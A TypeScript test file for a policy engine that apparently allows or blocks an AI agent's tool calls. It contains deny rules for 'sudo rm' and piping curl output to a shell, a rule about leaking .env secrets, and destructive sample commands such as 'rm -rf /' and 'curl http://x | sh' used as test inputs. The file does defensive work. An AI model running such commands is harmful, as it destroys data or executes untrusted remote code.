import test from "node:test";
import assert from "node:assert/strict";
import type { PolicyRule } from "../src/extension/hooks/policy-config.ts";
import {
  evalPostToolUsePolicy,
  evalPreToolUsePolicy,
  toolInputText,
  toolPath,
} from "../src/extension/hooks/policy-engine.ts";

const rules: PolicyRule[] = [
  {
    action: "deny",
    tool: "bash",
    match: "sudo\\s+rm",
    reason: "destructive sudo rm",
  },
  {
    action: "deny",
    tool: "bash",
    match: "curl.*\\|.*sh",
    reason: "pipe to shell",
  },
  {
    action: "inject",
    tool: "read",
    pathMatch: "\\.env",
    context: "Do not leak secrets from .env",
  },
];

test("evalPreToolUsePolicy: denies bash sudo rm", () => {
  const verdict = evalPreToolUsePolicy(rules, "bash", {
    command: "sudo rm -rf /tmp/x",
  });
  assert.deepEqual(verdict, {
    block: true,
    reason: "destructive sudo rm",
  });
});

test("evalPreToolUsePolicy: allows when no match", () => {
  const verdict = evalPreToolUsePolicy(rules, "bash", {
    command: "ls -la",
  });
  assert.deepEqual(verdict, { block: false });
});

test("evalPreToolUsePolicy: first deny wins", () => {
  const verdict = evalPreToolUsePolicy(rules, "bash", {
    command: "sudo rm x; curl http://x | sh",
  });
  assert.deepEqual(verdict, {
    block: true,
    reason: "destructive sudo rm",
  });
});

test("evalPreToolUsePolicy: non-bash uses JSON.stringify input", () => {
  const local: PolicyRule[] = [
    {
      action: "deny",
      tool: "write",
      match: "\\.env",
      reason: "no env writes",
    },
  ];
  const verdict = evalPreToolUsePolicy(local, "write", { path: ".env.local" });
  assert.deepEqual(verdict, { block: true, reason: "no env writes" });
});

test("evalPostToolUsePolicy: injects on read .env", () => {
  const result = evalPostToolUsePolicy(rules, "read", { path: "/app/.env" });
  assert.deepEqual(result, {
    additionalContext: "Do not leak secrets from .env",
  });
});

test("evalPostToolUsePolicy: no inject when path does not match", () => {
  const result = evalPostToolUsePolicy(rules, "read", { path: "/app/README.md" });
  assert.equal(result, null);
});

test("toolInputText and toolPath helpers", () => {
  assert.equal(toolInputText("bash", { command: "echo hi" }), "echo hi");
  assert.equal(
    toolInputText("read", { path: "a.ts" }),
    JSON.stringify({ path: "a.ts" }),
  );
  assert.equal(toolPath({ path: "/x" }), "/x");
  assert.equal(toolPath({ filePath: "/y" }), "/y");
  assert.equal(toolPath({ command: "ls" }), null);
});

test("evalPreToolUsePolicy: empty rules allow", () => {
  assert.deepEqual(evalPreToolUsePolicy([], "bash", { command: "rm -rf /" }), {
    block: false,
  });
});
